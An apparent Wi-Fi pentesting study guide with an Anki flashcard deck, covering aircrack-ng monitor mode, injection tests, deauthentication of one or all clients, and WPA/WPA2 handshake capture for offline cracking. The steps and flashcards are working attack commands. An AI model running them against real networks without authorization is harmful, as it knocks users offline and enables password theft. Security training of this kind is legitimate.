# Chain #4: Generating Traffic & Deauthentication

This chain explains how to use **Aireplay-ng** to generate traffic and perform deauthentication attacks. Aireplay-ng is essential when we need to:
- Capture WPA/WPA2 4-way handshakes by forcing clients to reconnect.
- Test whether our wireless card supports **packet injection**.
- Simulate client traffic on the target network.

---

## Step 1: Prepare the Wireless Interface

Before using Aireplay-ng, ensure the wireless interface is in **monitor mode** and tuned to the correct channel.

```bash
sudo airmon-ng start wlan0 6
```

- `wlan0` → your wireless interface.
- `6` → the target channel (replace with the real channel).
- The interface will usually be renamed to `wlan0mon`.

**If you're already in monitor mode, retune quickly before deauth/capture:**
```
sudo iw dev wlan0mon set channel <CHANNEL>
```
- Prevents the classic “waiting for beacon on the wrong channel” issue before you deauth or capture handshakes.

**Verify monitor mode:**

```bash
iwconfig
```

Look for `Mode:Monitor` in the output.

---

## Step 2: Test for Packet Injection

Before attacking, confirm your card can inject packets:

```bash
sudo aireplay-ng --test wlan0mon
```

- Aireplay-ng sends test probe requests.
- If you see **"Injection is working!"**, your card supports packet injection.

---

## Step 3: Scan for Access Points and Clients

Use Airodump-ng to identify APs and clients:

```bash
sudo airodump-ng wlan0mon
```

- `BSSID` → MAC address of the AP.
- `CH` → Channel.
- `ESSID` → Network name.
- `STATION` → Clients connected to the AP.

Take note of:
- The **AP BSSID** (target).
- The **client MAC** (optional — for targeted deauth).

---

## Step 4: Perform Deauthentication Attack

### Option A: Target a Specific Client

```bash
sudo aireplay-ng -0 5 -a <AP_BSSID> -c <CLIENT_MAC> wlan0mon
```

- `-0` → deauthentication attack.
- `5` → number of deauth packets to send (`0` = infinite).
- `-a <AP_BSSID>` → target AP MAC address.
- `-c <CLIENT_MAC>` → target client MAC address.
- `wlan0mon` → monitor interface.

This disconnects the specified client, forcing it to reconnect (useful for capturing WPA/WPA2 handshakes).

### Option B: Deauthenticate All Clients

```bash
sudo aireplay-ng -0 10 -a <AP_BSSID> wlan0mon
```

- This disconnects **all clients** connected to the AP.

---

## Step 5: Capture the Handshake

While sending deauth packets, run Airodump-ng to capture the WPA handshake:

```bash
sudo airodump-ng -c <CHANNEL> --bssid <AP_BSSID> -w capture wlan0mon
```

- `-c <CHANNEL>` → lock to the AP’s channel.
- `--bssid <AP_BSSID>` → target AP.
- `-w capture` → write to `capture.cap` file.

Watch for `WPA handshake: <AP_BSSID>` in the top-right corner of Airodump-ng.

---

## Step 6: Notes on Effectiveness

- **Protected Management Frames (PMF)** in WPA3 prevent deauth attacks.
- On WPA2, this is still highly effective.
- If clients reconnect automatically, you’ll capture the handshake quickly.
- If no clients are connected, you may need to **wait** or use another attack (e.g., Evil Twin).

---

## Anki Deck:

```
#separator:tab
#html:true
#guid column:1
#notetype column:2
#deck column:3
#tags column:6

G1x7tF9dL3	Basic (type in the answer)	Ops::WiFi Gym::Chain 4: Generating Traffic & Deauthentication	What Aireplay-ng command tests if your Wi-Fi card supports packet injection?	<code>sudo aireplay-ng --test &lt;interface&gt;</code>	wifi
H4p2cJ8mT6	Basic (type in the answer)	Ops::WiFi Gym::Chain 4: Generating Traffic & Deauthentication	What Aireplay-ng command deauthenticates a specific client from an AP?	<code>sudo aireplay-ng -0 &lt;count&gt; -a &lt;AP_BSSID&gt; -c &lt;CLIENT_MAC&gt; &lt;interface&gt;</code>	wifi
I5m9vK6qR1	Basic (type in the answer)	Ops::WiFi Gym::Chain 4: Generating Traffic & Deauthentication	What Aireplay-ng command deauthenticates all clients from an AP?	<code>sudo aireplay-ng -0 &lt;count&gt; -a &lt;AP_BSSID&gt; &lt;interface&gt;</code>	wifi
J2s8xH4nL7	Basic (type in the answer)	Ops::WiFi Gym::Chain 4: Generating Traffic & Deauthentication	What Airodump-ng command captures packets on a specific AP and channel, saving output to a file?	<code>sudo airodump-ng -c &lt;CHANNEL&gt; --bssid &lt;AP_BSSID&gt; -w &lt;filename&gt; &lt;interface&gt;</code>	wifi
K0z3bD7pV8	Basic (type in the answer)	Ops::WiFi Gym::Chain 4: Generating Traffic & Deauthentication	What command puts a Wi-Fi card into monitor mode on a specific channel using Airmon-ng?	<code>sudo airmon-ng start &lt;interface&gt; &lt;channel&gt;</code>	wifi

L2e6nF7tL1	Basic	Ops::WiFi Gym::Chain 4: Generating Traffic & Deauthentication	What is a deauthentication attack in Wi-Fi pentesting?	An attack that forces clients to disconnect from an AP by sending spoofed deauth frames, often used to capture WPA handshakes.	wifi
M5m0xJ8rQ2	Basic	Ops::WiFi Gym::Chain 4: Generating Traffic & Deauthentication	What does packet injection mean in Wi-Fi security testing?	The ability of a Wi-Fi card to craft and transmit custom frames into a wireless network.	wifi
N3t4bH9qP7	Basic	Ops::WiFi Gym::Chain 4: Generating Traffic & Deauthentication	What is a WPA handshake and why is it important?	A 4-packet exchange between a client and AP when connecting to a WPA/WPA2 network. Capturing it allows offline password cracking.	wifi
O1p9dK6mR5	Basic	Ops::WiFi Gym::Chain 4: Generating Traffic & Deauthentication	Why are deauthentication attacks ineffective against WPA3?	Because WPA3 uses Protected Management Frames (PMF), which authenticate and protect management frames like deauth packets.	wifi
P8q7fM2nL6	Basic	Ops::WiFi Gym::Chain 4: Generating Traffic & Deauthentication	What is the purpose of the <code>-0</code> option in Aireplay-ng?	It initiates a deauthentication attack.	wifi
mQ6eV9tLrB Basic (type in the answer) Ops::WiFi Gym::Chain 4: Generating Traffic & Deauthentication Which command quickly retunes a monitor interface to channel 1 before a deauth? <code>sudo iw dev wlan0mon set channel 1</code> wifi
```